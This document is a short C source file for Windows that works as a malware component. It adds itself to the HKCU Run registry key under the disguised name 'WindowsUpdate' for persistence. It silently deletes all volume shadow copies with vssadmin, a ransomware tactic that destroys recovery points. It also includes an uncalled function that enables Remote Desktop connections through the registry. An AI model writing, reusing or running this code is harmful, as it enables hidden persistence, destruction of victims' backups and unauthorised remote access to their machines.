#include <windows.h>
#include <stdio.h>
#include <shlobj.h>

void AddToRegistry()
{
    HKEY hKey;
    const char *path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char exePath[MAX_PATH];

    // 1. Get current executable path
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // 2. Open the "Run" registry key under HKCU
    if (RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        // 3. Add a new value "WindowsUpdate" with exe path
        RegSetValueEx(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE *)exePath, strlen(exePath) + 1);

        // 4. Close handle
        RegCloseKey(hKey);
    }
}

void destroy_shadow_copy()
{
    system("vssadmin delete shadows /all /quiet");
}



void create_remote_desktop()
{
    system("REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    

}






int main()
{

    AddToRegistry(); // Add to startup registry
    destroy_shadow_copy(); // Destroy shadow copies


    return 0;
}